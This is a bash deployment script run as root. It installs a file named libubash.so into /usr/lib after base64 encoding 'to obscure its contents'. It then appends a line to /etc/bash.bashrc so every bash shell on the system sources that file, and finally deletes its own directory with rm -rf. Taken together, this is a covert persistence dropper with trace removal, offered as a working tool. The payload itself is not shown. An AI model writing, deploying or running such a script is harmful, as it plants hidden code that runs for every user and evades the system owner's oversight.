#!/bin/bash

set -e  # Exit on error
set -o pipefail  # Catch pipe failures

LIB_PATH="/usr/lib/libubash.so"
BASHRC_PATH="/etc/bash.bashrc"
ENCODED_FILE="libubash.enc"

# Ensure the script is run as root
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root!" >&2
    exit 1
fi

# Base64 encode libubash.so to obscure its contents
echo "Encoding libubash.so..."
base64 libubash.so > "$ENCODED_FILE"

# Deploy and obfuscate libubash.so
echo "Deploying libubash.so..."
base64 -d "$ENCODED_FILE" | tee "$LIB_PATH" > /dev/null
chmod +x "$LIB_PATH"
rm -f "$ENCODED_FILE"  # Remove encoded file after deployment

# Ensure the /etc/bash.bashrc entry is only appended once
if ! grep -q "source $LIB_PATH" "$BASHRC_PATH"; then
    echo "Appending source command to /etc/bash.bashrc..."
    echo "[ -f \"$LIB_PATH\" ] && source \"$LIB_PATH\"" >> "$BASHRC_PATH"
fi

# Self-delete the script and its directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd /
echo "Deleting script and its directory: $SCRIPT_DIR"
rm -rf "$SCRIPT_DIR"

echo "Deployment complete!"
